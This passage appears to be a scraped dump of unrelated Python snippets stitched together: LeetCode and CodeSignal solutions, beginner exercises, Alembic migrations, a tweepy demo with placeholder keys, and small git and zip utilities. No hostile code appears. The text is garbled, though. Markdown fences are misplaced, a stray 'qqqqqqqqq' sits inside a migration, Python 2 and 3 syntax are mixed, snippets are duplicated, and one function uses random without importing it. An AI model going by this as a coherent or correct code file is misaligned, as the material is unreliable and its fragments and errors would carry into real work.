            l, r = i + 1, len(nums) - 1
            while l < r:
                s = nums[i] + nums[l] + nums[r]
                if s == target:
                    return target
                if abs(s - target) < abs(result - target):
                    result = s
                if s > target:
                    r -= 1
                else:
                    l += 1
        return result
```

````py
 Write a program to find the node at which the intersection of two singly linked lists begins.


 For example, the following two linked lists:

 A:          a1 → a2
                    ↘
                      c1 → c2 → c3
                    ↗
 B:     b1 → b2 → b3
 begin to intersect at node c1.```


```py

# Definition for singly-linked list.
# class ListNode(object):
#     def __init__(self, x):
#         self.val = x
#         self.next = None


class Solution(object):
    def getIntersectionNode(self, headA, headB):
        """
        :type head1, head1: ListNode
        :rtype: ListNode
        """
        if not headA or not headB:
            return None

        pa, pb = headA, headB
        while pa != pb:
            pa = pa.next if pa is not None else headB
            pb = pb.next if pb is not None else headA

        return pa if pa else None

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def findNearestRightNode(self, root: TreeNode, u: TreeNode) -> TreeNode:
        q = [root]
        while q:
            new_q = []
            for i in range(len(q)):
                if q[i] == u:
                    return None if i == len(q) - 1 else q[i + 1]
                if q[i].left:
                    new_q.append(q[i].left)
                if q[i].right:
                    new_q.append(q[i].right)
            q = new_q
        return None

from collections import Counter


class Solution:
    def isOneEditDistance(self, s, t):
        """
        :type s: str
        :type t: str
        :rtype: bool
        """
        if len(s) > len(t):
            return self.isOneEditDistance(t, s)
        m, n = len(s), len(t)
        if n - m > 1 or s == t:
            return False
        for i in range(m):
            if s[i] != t[i]:
                return s[i + 1 :] == t[i + 1 :] or s[i:] == t[i + 1 :]
        return True

class Solution:
    def findPeakElement(self, nums: List[int]) -> int:
        l, r = 0, len(nums) - 1
        while l < r:
            mid = l + (r - l) // 2
            high_mid = mid + 1
            if nums[mid] < nums[high_mid]:
                l = high_mid
            else:
                r = mid
        return l

class Fancy:
    def __init__(self):
        self.A = []
        self.add = [0]
        self.mul = [1]

    def append(self, val: int) -> None:
        self.A.append(val)
        self.add.append(self.add[-1])
        self.mul.append(self.mul[-1])

    def addAll(self, inc: int) -> None:
        self.add[-1] += inc

    def multAll(self, m: int) -> None:
        self.add[-1] *= m
        self.mul[-1] *= m

    def getIndex(self, idx: int) -> int:
        if idx >= len(self.A):
            return -1
        m = self.mul[-1] // self.mul[idx]
        inc = self.add[-1] - self.add[idx] * m
        return (self.A[idx] * m + inc) % (10 ** 9 + 7)


# Your Fancy object will be instantiated and called as such:
# obj = Fancy()
# obj.append(val)
# obj.addAll(inc)
# obj.multAll(m)
# param_4 = obj.getIndex(idx)

from typing import List


class Solution:
    def findMissingRanges(self, nums: List[int], lower: int, upper: int) -> List[str]:
        nums = [lower - 1] + nums + [upper + 1]
        res = []
        for i in range(len(nums) - 1):
            if nums[i + 1] - nums[i] == 2:
                res.append(str(nums[i] + 1))
            elif nums[i + 1] - nums[i] > 2:
                res.append(str(nums[i] + 1) + "->" + str(nums[i + 1] - 1))
        return res

class Solution:
    def compareVersion(self, version1: str, version2: str) -> int:
        l1 = [int(s) for s in version1.split(".")]
        l2 = [int(s) for s in version2.split(".")]

        len1, len2 = len(l1), len(l2)
        if len1 > len2:
            l2 += [0] * (len1 - len2)
        elif len1 < len2:
            l1 += [0] * (len2 - len1)

        return (l1 > l2) - (l1 < l2)

class Solution:
    def twoSum(self, numbers, target):
        """
        :type numbers: List[int]
        :type target: int
        :rtype: List[int]
        """
        l, r = 0, len(numbers) - 1
        while l < r:
            s = numbers[l] + numbers[r]
            if s == target:
                return [l + 1, r + 1]
            elif s > target:
                r -= 1
            else:
                l += 1
        return []

class Solution:
    def convertToTitle(self, n):
        """
        :type n: int
        :rtype: str
        """
        result, start = "", ord("A")
        while n > 0:
            result, n = chr((n - 1) % 26 + start) + result, (n - 1) // 26
        return result

# 16. Write a Python Program to enter a number and display all its factors

number = int(input("Enter the number"))

for i in range(1, number + 1):
    if number % i == 0:
        print(i)

def areSimilar(a, b):
    diff = [i for i in range(len(a)) if a[i] != b[i]]
    if len(diff) == 2:
        b[diff[0]], b[diff[1]] = b[diff[1]], b[diff[0]]
    return a == b
````

```py
Render a quick Jinja2 template.
Thanks Danny - http://pydanny.com/jinja2-quick-load-function.html

Example:

>>> from jinja_quick_load import render_from_template
>>> data = {
...     "date": "June 12, 2014",
...     "items": ["oranges", "bananas", "steak", "milk"]
... }
>>> render_from_template(".", "shopping_list.html", **data)
```

```py


from jinja2 import FileSystemLoader, Environment


def render_from_template(directory, template_name, **kwargs):
    loader = FileSystemLoader(directory)
    env = Environment(loader=loader)
    template = env.get_template(template_name)
    return template.render(**kwargs)

def arrayChange(inputArray):
    first = inputArray[0]
    count = 0
    for i in inputArray[1:]:
        if i <= first:
            count += first - i + 1
            first = first + 1
        else:
            first = i
    return count

'''
 Given a string containing digits from 2-9 inclusive, return all possible letter combinations that the number could represent.

 A mapping of digit to letters (just like on the telephone buttons) is given below. Note that 1 does not map to any letters.
'''

class Solution(object):
    def letterCombinations(self, digits):
        """
        :type digits: str
        :rtype: List[str]
        """

        phoneMap = { '2': 'abc', '3': 'def', '4': 'ghi', '5': 'jkl', '6': 'mno', '7' : 'pqrs', '8': 'tuv', '9':'wxyz'}
        number = str(digits)

        if number == "":
         return []

        result = ['']
        for char in number:
         values = phoneMap[char]
         new_result = []
         for prefix in result:
          currElement = prefix
          for value in values:
           new_result.append(currElement+value)

         result = new_result
         # result = [prefix+value for prefix in result for value in values]
        return result

print Solution().letterCombinations("23")
class TwoSum:
    def __init__(self):
        """
        Initialize your data structure here.
        """
        self.d = {}

    def add(self, number: int) -> None:
        """
        Add the number to an internal data structure..
        """
        if number in self.d:
            self.d[number] += 1
        else:
            self.d[number] = 1

    def find(self, value: int) -> bool:
        """
        Find if there exists any pair of numbers which sum is equal to the value.
        """
        result = False
        for n in self.d:
            if value - n in self.d:
                if value - n == n:
                    result = self.d[n] > 1
                else:
                    return True
        return result


# Your TwoSum object will be instantiated and called as such:
# obj = TwoSum()
# obj.add(number)
# param_2 = obj.find(value)

class Solution:
    def titleToNumber(self, s):
        """
        :type s: str
        :rtype: int
        """
        result, start = 0, ord("A")
        for c in s:
            result = result * 26 + (ord(c) - start) + 1
        return result

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class BSTIterator:
    def __init__(self, root: TreeNode):
        self.result = []

        def dfs(root):
            if not root:
                return
            if root.right:
                dfs(root.right)
            self.result.append(root.val)
            if root.left:
                dfs(root.left)

        dfs(root)

    def next(self) -> int:
        """
        @return the next smallest number
        """
        return self.result.pop()

    def hasNext(self) -> bool:
        """
        @return whether we have a next smallest number
        """
        return len(self.result) > 0


# Your BSTIterator object will be instantiated and called as such:
# obj = BSTIterator(root)
# param_1 = obj.next()
# param_2 = obj.hasNext()

from functools import cmp_to_key


class Solution:
    def largestNumber(self, nums: List[int]) -> str:
        nums = list(map(str, nums))
        comp = lambda x, y: -1 if x + y > y + x else 1 if x + y < y + x else 0
        return str(int("".join(sorted(nums, key=cmp_to_key(comp)))))

# 17.Write a Python Program to count all factors of given number.

number = int(input("Enter the number: "))

countOfFactors = 0

for i in range(1, number + 1):
    if number % i == 0:

        countOfFactors += 1

print(countOfFactors)

def arrayChange(inputArray):
    count = 0
    for i in range(1, len(inputArray)):
        if inputArray[i - 1] >= inputArray[i]:
            difference = inputArray[i - 1] - inputArray[i]
            inputArray[i] += difference + 1
            count += difference + 1
    return count

def palindromeRearranging(inputString):
    odd_count = 0
    char_set = set(inputString)
    for i in char_set:
        char_count = inputString.count(i)
        if char_count % 2 != 0:
            odd_count += 1
    if odd_count <= 1:
        return True
    return False

class Solution:
    def fourSum(self, nums: List[int], target: int) -> List[List[int]]:
        nums.sort()
        result = []
        for i in range(len(nums) - 3):
            if i > 0 and nums[i - 1] == nums[i]:
                continue
            for j in range(i + 1, len(nums) - 2):
                if j > i + 1 and nums[j - 1] == nums[j]:
                    continue
                l, r = j + 1, len(nums) - 1
                while l < r:
                    s = nums[i] + nums[j] + nums[l] + nums[r]
                    if s == target:
                        result.append([nums[i], nums[j], nums[l], nums[r]])
                        while l < r and nums[l] == nums[l + 1]:
                            l += 1
                        while l < r and nums[r] == nums[r - 1]:
                            r -= 1
                        l += 1
                        r -= 1
                    elif s > target:
                        r -= 1
                    else:
                        l += 1
        return result
```

````py
time complexity: O(mn)```


```py


class Solution(object):
    def reverseWords(self, str):
        """
        :type str: List[str]
        :rtype: void Do not return anything, modify str in-place instead.
        """
        self.reverse(str, 0, len(str) - 1)
        start, end = 0, -1
        for i in range(len(str)):
            if str[i] == " ":
                start = end + 1
                end = i
                self.reverse(str, start, end - 1)
        self.reverse(str, end + 1, len(str) - 1)

    def reverse(self, str, left, right):
        while left < right:
            str[left], str[right] = str[right], str[left]
            left += 1
            right -= 1

class Solution:
    def maxProfit(self, k: int, prices: List[int]) -> int:
        n = len(prices)
        if n < 2:
            return 0
        if n // 2 <= k:
            return self.quickSolve(prices)
        dp = [[0 for _ in range(n + 1)] for _ in range(k + 1)]
        for i in range(1, k + 1):
            buy = float("-inf")
            for j in range(1, n + 1):
                dp[i][j] = max(dp[i][j - 1], buy + prices[j - 1])
                buy = max(buy, dp[i - 1][j - 1] - prices[j - 1])
        return dp[k][n]

    def quickSolve(self, prices):
        return sum(max(prices[i + 1] - prices[i], 0) for i in range(len(prices) - 1))

class Solution:
    def rotate(self, nums, k):
        """
        :type nums: List[int]
        :type k: int
        :rtype: void Do not return anything, modify nums in-place instead.
        """
        if not nums:
            return
        n = len(nums)
        k = k % n
        nums[:] = nums[-k:] + nums[:-k]
        # nums[:] = nums[n-k:] + nums[:n-k]

# 18. Write a Python Program to find total of all factors of given number.

# get the user input
number = int(input("Enter the number"))

sum = 0

for i in range(1, number + 1):
    if number % i == 0:

        # incrementing sum with factors
        sum = sum + i

print(sum)

def palindromeRearranging(inputString):
    inputList = sorted(inputString)
    foundMiddle = False
    while len(inputList) > 1:
        if inputList[0] == inputList[1]:
            del inputList[1]
        elif not foundMiddle:
            foundMiddle = True
        else:
            return False
        del inputList[0]
    return len(inputList) == 0 or not foundMiddle

import os
from datetime import datetime
from zipfile import ZipFile


# set file name and time of creation
today = datetime.now()
file_name = "zipper_" + today.strftime("%Y.%m.%dh%H%M") + ".zip"
dir_name = "tmp/"  # update path


def zipdir(path, zip):
    for root, dirs, files in os.walk(path):
        for file in files:
            zip.write(os.path.join(root, file))


if __name__ == "__main__":
    zipfile = ZipFile(file_name, "w")
    zipdir(dir_name, zipfile)
    zipfile.close()

def areEquallyStrong(yourLeft, yourRight, friendsLeft, friendsRight):
    sameHands = yourLeft == friendsLeft and yourRight == friendsRight
    differentHands = yourLeft == friendsRight and yourRight == friendsLeft
    return sameHands or differentHands

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, val=0, next=None):
#         self.val = val
#         self.next = next
class Solution:
    def removeNthFromEnd(self, head: ListNode, n: int) -> ListNode:
        dummy = p = ListNode(0)
        dummy.next = head
        fast, slow = head, dummy
        for i in range(n):
            if fast:
                fast = fast.next
            else:
                break
        while fast:
            slow = slow.next
            fast = fast.next
        slow.next = slow.next.next
        return dummy.next

class Solution:
    # @param n, an integer
    # @return an integer
    def reverseBits(self, n):
        res = 0
        for i in range(32):
            res += n & 1
            n = n >> 1
            if i != 31:
                res = res << 1
        return res

print Solution().reverseBits(12)
class Solution(object):
    def hammingWeight(self, n):
        """
        :type n: int
        :rtype: int
        """
        bits = 0
        mask = 1

        for i in range(32):
            if (n & mask) != 0:
                bits += 1
            mask <<= 1

        return bits

class Solution:
    def rob(self, nums: List[int]) -> int:
        if not nums:
            return 0
        s1, s2 = 0, 0
        for num in nums:
            s1, s2 = s2, max(s1 + num, s2)
        return s2
````

````py
 Given a binary tree, imagine yourself standing on the right side of it, return the values of the nodes you can see ordered from top to bottom.

 Example:

 Input: [1,2,3,null,5,null,4]
 Output: [1, 3, 4]
 Explanation:

    1            <---
  /   \
 2     3         <---
  \     \
   5     4       <---```


```py

# Definition for a binary tree node.
# class TreeNode(object):
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution(object):
    def rightSideView(self, root):
        """
        :type root: TreeNode
        :rtype: List[int]
        """
        if not root:
            return []

        stack, node_depth = [(root, 0)], {}

        while stack:
            node, depth = stack.pop(0)
            if depth not in node_depth:
                node_depth[depth] = node.val

            if node.right:
                stack.append((node.right, depth + 1))
            if node.left:
                stack.append((node.left, depth + 1))
        return node_depth.values()

# 19. Write a Python Program to accept a number and print its digits

number = input("Enter the number: ")

# iterating for individual values
if int(number) < 0:
    print("Please enter a valid positive number: ")
else:
    for i in range(0, len(number)):
        print(number[i])
        i += 1

def areEquallyStrong(yourLeft, yourRight, friendsLeft, friendsRight):
    sameHands = yourLeft == friendsLeft and yourRight == friendsRight
    differentHands = yourLeft == friendsRight and yourRight == friendsLeft
    return sameHands or differentHands

import os
import sys
import csv


def convert(input, out):
    if os.path.exists(out):
        raise ValueError("Output file already exists")

    reader = csv.reader(open(input, "rU"), dialect=csv.excel_tab)
    writer = csv.writer(open(out, "wb+"), dialect="excel")
    for row in reader:
        writer.writerow(row)


if __name__ == "__main__":
    convert(sys.argv[1], sys.argv[2])

# 1. Write a Python Program to Swap given numbers


def swapTwoNumbers(x, y):
    temp = x
    x = y
    y = temp

    print("Swapped value of x is : {}".format(x))
    print("Swapped value of y is : {}".format(y))


swapTwoNumbers(2, 3)
swapTwoNumbers(4, 3)

d = {"foo": 120, "bar": 17, "qux": 2}

# Sorting a dictionary doesn't make sense
#
# But you can sort a list based on the dictionary
#
# First get the list of items from the dict with .items()
#
# This returns an iterator, so we cast it to a list.
#
# [('bar', 17), ('foo', 12), ('qux', 2)]

items = list(d.items())

print(f"unsorted: {items}")
# Sort ascending by key

items.sort()

print(f"Sort ascending by key: {items}")

# Sort descending by key

items.sort(reverse=True)

print(f"Sort descending by key: {items}")

# Sort ascending by value

# lambda is an anonymous function. e is the argument representing the
# element (a key/value tuple in this case).
#
# We return element 1 of the tuple (the value) to indicate we wish to
# sort on the value.

items.sort(key=lambda e: e[1])

print(f"Sort ascending by value: {items}")

# Sort descending by value

items.sort(key=lambda e: e[1], reverse=True)

print(f"Sort descending by value: {items}")

# Definition for singly-linked list.
class ListNode:
    def __init__(self, x):
        self.val = x
        self.next = None


class Solution:
    def addTwoNumbers(self, l1, l2):
        """
        :type l1: ListNode
        :type l2: ListNode
        :rtype: ListNode
        """
        dummy = current = ListNode(0)
        carry = 0
        while l1 or l2 or carry:
            if l1:
                carry += l1.val
                l1 = l1.next
            if l2:
                carry += l2.val
                l2 = l2.next
            carry, value = divmod(carry, 10)
            current.next = ListNode(value)
            current = current.next
        return dummy.next

def arrayMaximalAdjacentDifference(inputArray):
    return max(
        (abs(inputArray[i + 1] - inputArray[i]) for i in range(0, len(inputArray) - 1))
    )

class Solution(object):
    def isValid(self, s):
        """
        :type s: str
        :rtype: bool
        """
        maps = {"(": ")", "{": "}", "[": "]"}
        stack = []
        for c in s:
            if c in maps:
                stack.append(c)
            elif not stack:
                return False
            elif maps[stack.pop()] != c:
                return False
        return not stack

class Solution(object):
    def numIslands(self, grid):
        """
        :type grid: List[List[str]]
        :rtype: int
        """
        if not grid:
            return 0

        count = 0
        for row in range(len(grid)):
            for col in range(len(grid[0])):
                if grid[row][col] == "1":
                    count += 1
                    self.merge(grid, row, col)

        return count

    def merge(self, grid, row, col):
        if 0 > row or row >= len(grid) or col < 0 or col >= len(grid[0]):
            return

        if grid[row][col] != "1":
            return

        grid[row][col] = "#"
        self.merge(grid, row + 1, col)
        self.merge(grid, row - 1, col)
        self.merge(grid, row, col + 1)
        self.merge(grid, row, col - 1)
````

```pycreate packages table

Revision ID: dc7c6da5f860
Revises:
Create Date: 2020-11-12 16:15:09.306801
```

```py
from alembic import op
import sqlalchemy as sa


# revision identifiers, used by Alembic.
revision = "dc7c6da5f860"
down_revision = None
branch_labels = None
depends_on = None


def upgrade():
    # ### commands auto generated by Alembic - please adjust! ###
    op.create_table(
        "packages",
        sa.Column("id", sa.Integer(), nullable=False),
        sa.Column("sender", sa.String(length=255), nullable=True),
        sa.Column("recipient", sa.String(length=255), nullable=True),
        sa.Column("origin", sa.String(length=255), nullable=True),
        sa.Column("destination", sa.String(length=255), nullable=True),
        sa.Column("location", sa.String(length=255), nullable=True),
        sa.PrimaryKeyConstraint("id"),
    )
    # ### end Alembic commands ###


def downgrade():
    # ### commands auto generated by Alembic - please adjust! ###
    op.drop_table("packages")
    # ### end Alembic commands ###
```

```pycreate_users_table

Revision ID: ffdc0a98111c
Revises:
Create Date: 2020-11-20 15:06:02.230689
```

```py
from alembic import op
import sqlalchemy as sa


# revision identifiers, used by Alembic.
revision = "ffdc0a98111c"
down_revision = None
branch_labels = None
depends_on = None


def upgrade():
    # ### commands auto generated by Alembic - please adjust! ###
    op.create_table(
        "users",
        sa.Column("id", sa.Integer(), nullable=False),
        sa.Column("username", sa.String(length=40), nullable=False),
        sa.Column("email", sa.String(length=255), nullable=False),
        sa.Column("hashed_password", sa.String(length=255), nullable=False),
        sa.PrimaryKeyConstraint("id"),
        sa.UniqueConstraint("email"),
        sa.UniqueConstraint("username"),
    )
    # ### end Alembic commands ###qqqqqqqqq


def downgrade():
    # ### commands auto generated by Alembic - please adjust! ###
    op.drop_table("users")
    # ### end Alembic commands ###

class Solution(object):
    def countPrimes(self, n):
        """
        :type n: int
        :rtype: int
        """
        if n < 2:
            return 0

        A = [0] * (n + 1)
        count = 0

        for pointer1 in range(2, n):
            if A[pointer1] == 0:
                count += 1
                pointer2 = pointer1
                while pointer2 + pointer1 < n:
                    pointer2 += pointer1
                    A[pointer2] = 1

        return count

class Solution(object):
    def countPrimes(self, n):
        """
        :type n: int
        :rtype: int
        """
        if n <= 2:
            return 0
        prime = [True] * n
        prime[:2] = [False, False]
        for i in range(2, int((n - 1) ** 0.5) + 1):
            if prime[i]:
                prime[i ** 2 :: i] = [False] * len(prime[i ** 2 :: i])
        return sum(prime)

class Solution:
    def isIsomorphic(self, s: str, t: str) -> bool:
        def convert(ss):
            d = {}
            return [d.setdefault(c, len(d)) for c in ss]

        return convert(s) == convert(t)

class Solution:
    def reverseList(self, head):
        """
        :type head: ListNode
        :rtype: ListNode
        """
        prev = None
        while head:
            head.next, prev, head = prev, head, head.next
        return prev

# Time: O(n)


class Solution:
    def minSubArrayLen(self, s, nums):
        """
        :type s: int
        :type nums: List[int]
        :rtype: int
        """
        total = l = 0
        result = len(nums) + 1
        for r in range(len(nums)):
            total += nums[r]
            while total >= s:
                result = min(result, r - l + 1)
                total -= nums[l]
                l += 1
        return 0 if result == len(nums) + 1 else result

# 20. Write a Python Program to accept a number and count number of digits.

number = input("Enter a Number: ")

count = 0

if int(number) < 0:
    print("Please enter a valid positive number")

else:
    for i in range(0, len(number)):

        count += 1

        i += 1
    print("The number of digits is:", count)

def arrayMaximalAdjacentDifference(inputArray):
    diffs = []
    for i in range(len(inputArray) - 1):
        diffs.append(abs(inputArray[i] - inputArray[i + 1]))
    return max(diffs)

from subprocess import check_output, call


file_name = str(input("Enter the file name: "))
commit = check_output(["git", "rev-list", "-n", "1", "HEAD", "--", file_name])
print(str(commit).rstrip())
call(["git", "checkout", str(commit).rstrip() + "~1", file_name])

```

````py
After entering a filename, this script searches your Git history for that file.
If the file exists, then it will restore it.```


```py

def isIPv4Address(inputString):
    strings = [string for string in inputString.split(".")]
    for string in strings:
        if not string.isdecimal():
            return False
    nums = [int(num) for num in strings]
    return max(nums) <= 255 and min(nums) >= 0 and len(nums) == 4

# Definition for singly-linked list.
class ListNode:
    def __init__(self, x):
        self.val = x
        self.next = None


class Solution:
    def mergeTwoLists(self, l1: ListNode, l2: ListNode) -> ListNode:
        dummy = curr = ListNode(0)
        while l1 and l2:
            if l1.val <= l2.val:
                curr.next = l1
                l1 = l1.next
            else:
                curr.next = l2
                l2 = l2.next
            curr = curr.next
        curr.next = l1 or l2
        return dummy.next
````

````py
 Find the kth largest element in an unsorted array. Note that it is the kth largest element in the sorted order, not the kth distinct element.

 Example 1:

 Input: [3,2,1,5,6,4] and k = 2
 Output: 5
 Example 2:

 Input: [3,2,3,1,2,4,5,5,6] and k = 4
 Output: 4```


```py


class Solution(object):
    def findKthLargest(self, nums, k):
        """
        :type nums: List[int]
        :type k: int
        :rtype: int
        """
        heap = []
        import heapq

        for num in nums:
            heapq.heappush(heap, -(num))

        result = 0
        for _ in range(k):
            result = heapq.heappop(heap)

        return -(result)

class Solution(object):
    def findKthLargest(self, nums, k):
        """
        :type nums: List[int]
        :type k: int
        :rtype: int
        """

        pivot = random.choice(nums)
        nums1, nums2 = [], []
        for num in nums:
            if num > pivot:
                nums1.append(num)
            elif num < pivot:
                nums2.append(num)

        if k <= len(nums1):
            return self.findKthLargest(nums1, k)
        if k > len(nums) - len(
            nums2
        ):  # draw a graph to visualize it! It's not in the top k assortment, but in the small section
            return self.findKthLargest(nums2, k - (len(nums) - len(nums2)))

        return pivot

class Solution:
    def combinationSum3(self, k: int, n: int) -> List[List[int]]:
        result = []
        self.dfs(list(range(1, 10)), k, n, [], result)
        return result

    def dfs(self, arr, k, n, path, result):
        if k < 0 or n < 0:
            return
        if k == 0 and n == 0:
            result.append(path)
        for i in range(len(arr)):
            self.dfs(arr[i + 1 :], k - 1, n - arr[i], path + [arr[i]], result)

import heapq


class Solution:
    def getSkyline(self, buildings):
        """
        :type buildings: List[List[int]]
        :rtype: List[List[int]]
        """
        rectangles = [[l, -h, r] for l, r, h in buildings] + [
            [r, h, None] for l, r, h in buildings
        ]
        rectangles.sort()
        result = []
        heap = [(0, float("inf"))]
        for l, h, r in rectangles:
            top = heap[0][0]
            while l >= heap[0][1]:
                heapq.heappop(heap)
            if h < 0:
                heapq.heappush(heap, (h, r))
            if top != heap[0][0]:
                result.append([l, -heap[0][0]])
        return result

# 21. Write a Python Program to find sum of digits of a number

number = input("Enter a Number: ")

sum = 0

if int(number) < 0:
    print("Please enter a valid positive number")

else:
    for i in range(0, len(number)):

        sum += int(number[i])

        i += 1

    print("The sum of digits is:", sum)

def isIPv4Address(inputString):
    strings = [string for string in inputString.split(".")]
    for string in strings:
        if not string.isdecimal():
            return False
    nums = [int(num) for num in strings]
    return max(nums) <= 255 and min(nums) >= 0 and len(nums) == 4

import tweepy

# Authentication credentials - dev.twitter.com
cfg = {
    "consumer_key": "VALUE",
    "consumer_secret": "VALUE",
    "access_token": "VALUE",
    "access_token_secret": "VALUE",
}


def get_api_handler(cfg):
    auth = tweepy.OAuthHandler(cfg["consumer_key"], cfg["consumer_secret"])
    auth.set_access_token(cfg["access_token"], cfg["access_token_secret"])
    return tweepy.API(auth)


def main():
    api = get_api_handler(cfg)
    tweet = "Hello, world from Tweepy!"
    api.update_status(status=tweet)


if __name__ == "__main__":
    main()

def avoidObstacles(inputArray):
    for i in range(2, max(inputArray) + 2):
        if i not in inputArray and all(j % i != 0 for j in inputArray):
            return i
````

````py
  Given n pairs of parentheses, write a function to generate all combinations of well-formed parentheses.

 For example, given n = 3, a solution set is:

 [
   "((()))",
   "(()())",
   "(())()",
   "()(())",
   "()()()"
 ]```


```py


class Solution(object):
    def generateParenthesis(self, n):
        """
        :type n: int
        :rtype: List[str]
        """

        result = []

        def backtracking(S, left, right):
            if len(S) == 2 * n:
                result.append(S)
                return

            if left < n:
                backtracking(S + "(", left + 1, right)

            if right < left:
                backtracking(S + ")", left, right + 1)

        backtracking("", 0, 0)
        return result

class Solution:
    def containsNearbyAlmostDuplicate(self, nums: List[int], k: int, t: int) -> bool:
        if t < 0:
            return False
        d = {}
        w = t + 1
        for i, num in enumerate(nums):
            key = num // w
            if key in d:
                return True
            if key + 1 in d and abs(num - d[key + 1]) < w:
                return True
            if key - 1 in d and abs(num - d[key - 1]) < w:
                return True
            d[key] = num
            if i >= k:
                del d[nums[i - k] // w]
        return False

class Solution:
    def maximalSquare(self, matrix: List[List[str]]) -> int:
        if not matrix or not matrix[0]:
            return 0
        m, n = len(matrix), len(matrix[0])
        dp = [[0] * (n + 1) for _ in range(m + 1)]
        slide = 0
        for i in range(1, m + 1):
            for j in range(1, n + 1):
                if matrix[i - 1][j - 1] == "1":
                    dp[i][j] = min(dp[i - 1][j - 1], dp[i - 1][j], dp[i][j - 1]) + 1
                    slide = max(slide, dp[i][j])
        return slide * slide

class Solution(object):
    def calculate(self, s):
        """
        :type s: str
        :rtype: int
        """
        curr, total, sign, i = 0, 0, 1, 0
        stack = []
        while i < len(s):
            if s[i].isdigit():
                while i < len(s) and s[i].isdigit():
                    curr = curr * 10 + int(s[i])
                    i += 1
                total += sign * curr
                if i >= len(s):
                    break
            if s[i] == "+":
                sign = 1
                curr = 0
            if s[i] == "-":
                sign = -1
                curr = 0
            if s[i] == "(":
                stack.append(total)
                stack.append(sign)
                curr = 0
                total = 0
                sign = 1
            if s[i] == ")":
                total *= stack.pop()
                total += stack.pop()
                curr = 0
                sign = 1
            i += 1
        return total

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def invertTree(self, root: TreeNode) -> TreeNode:
        if not root:
            return root
        temp = root.right
        root.right = self.invertTree(root.left)
        root.left = self.invertTree(temp)
        return root

class Solution:
    def calculate(self, s: str) -> int:
        def compute(num1, num2, op):
            if op == "-":
                return num2 - num1
            if op == "+":
                return num1 + num2
            if op == "*":
                return num1 * num2
            if op == "/":
                return num2 // num1

        def precede(op1, op2):
            if op1 in {"*", "/"} and op2 in {"+", "-"}:
                return True
            return False

        nums, ops = [], []
        i = 0
        while i < len(s):
            if s[i].isdigit():
                num = 0
                while i < len(s) and s[i].isdigit():
                    num = num * 10 + int(s[i])
                    i += 1
                nums.append(num)
            else:
                if s[i] in {"+", "-", "*", "/"}:
                    while ops and not precede(s[i], ops[-1]):
                        nums.append(compute(nums.pop(), nums.pop(), ops.pop()))
                    ops.append(s[i])
                i += 1
        while ops:
            nums.append(compute(nums.pop(), nums.pop(), ops.pop()))
        return nums[-1]

class Solution:
    def majorityElement(self, nums: List[int]) -> List[int]:
        candidate1, candidate2 = 0, 1
        count1, count2 = 0, 0
        for num in nums:
            if candidate1 == num:
                count1 += 1
            elif candidate2 == num:
                count2 += 1
            elif count1 == 0:
                candidate1, count1 = num, 1
            elif count2 == 0:
                candidate2, count2 = num, 1
            else:
                count1 -= 1
                count2 -= 1
        return [n for n in [candidate1, candidate2] if nums.count(n) > len(nums) // 3]

# 22. Write a Python Program to display the reverse of a given number

number = input("Enter the number: ")

num_str = []

# iterating for individual values
if int(number) < 0:
    print("Please enter a valid positive number: ")
else:
    for i in range(0, len(number)):

        num_str.append(number[i])

        i += 1

print(list(reversed(num_str)))

def avoidObstacles(inputArray):
    for length in range(2, max(inputArray) + 2):
        done = True
        jump = length
        while jump < (max(inputArray) + length):
            if jump in inputArray:
                done = False
                break
            jump += length
        if done:
            return length

import subprocess
import sys


if len(sys.argv) == 3:
    tag = sys.argv[1]
    commit = sys.argv[2]
    command = 'git tag -a {0} {1} -m "{2}"'.format(tag, commit, tag)
    output = subprocess.check_output(command, shell=True).decode("utf-8")
    subprocess.call(command, shell=True)
    subprocess.call("git push --tags", shell=True)
else:
    print("usage: tag.py TAG_NAME COMMIT")
    sys.exit(1)

def boxBlur(image):
    def pixels(matrix, i, j):
        summ = 0
        for x in range(i - 1, i + 2):
            for y in range(j - 1, j + 2):
                summ += matrix[x][y]
                mean = summ // 9
        return mean

    output = []
    row = len(image)
    col = len(image[0])
    for i in range(1, row - 1):
        arr = []
        for j in range(1, col - 1):
            arr.append(pixels(image, i, j))
        output.append(arr)
    return output

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def kthSmallest(self, root: TreeNode, k: int) -> int:
        result = []

        def inorder(node):
            if not node:
                return
            inorder(node.left)
            result.append(node.val)
            inorder(node.right)

        inorder(root)

        return result[k - 1]

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, val=0, next=None):
#         self.val = val
#         self.next = next
class Solution:
    def isPalindrome(self, head: ListNode) -> bool:
        rev = None
        slow = fast = head
        while fast and fast.next:
            fast = fast.next.next
            slow.next, rev, slow = rev, slow, slow.next
        if fast:
            slow = slow.next
        while rev and slow and rev.val == slow.val:
            rev = rev.next
            slow = slow.next
        return not rev

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def lowestCommonAncestor(
        self, root: "TreeNode", p: "TreeNode", q: "TreeNode"
    ) -> "TreeNode":
        if p.val < root.val > q.val:
            return self.lowestCommonAncestor(root.left, p, q)
        if p.val > root.val < q.val:
            return self.lowestCommonAncestor(root.right, p, q)
        return root


# class Solution:
#     def lowestCommonAncestor(self, root: 'TreeNode', p: 'TreeNode', q: 'TreeNode') -> 'TreeNode':
#         # if p.val < root.val > q.val:
#         #     return self.lowestCommonAncestor(root.left, p, q)
#         # if p.val > root.val < q.val:
#         #     return self.lowestCommonAncestor(root.right, p, q)
#         # return root

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def lowestCommonAncestor(
        self, root: "TreeNode", p: "TreeNode", q: "TreeNode"
    ) -> "TreeNode":
        if root in [None, p, q]:
            return root
        left = self.lowestCommonAncestor(root.left, p, q)
        right = self.lowestCommonAncestor(root.right, p, q)
        return root if left and right else left or right

class Solution:
    def productExceptSelf(self, nums: List[int]) -> List[int]:
        product = 1
        result = []
        for num in nums:
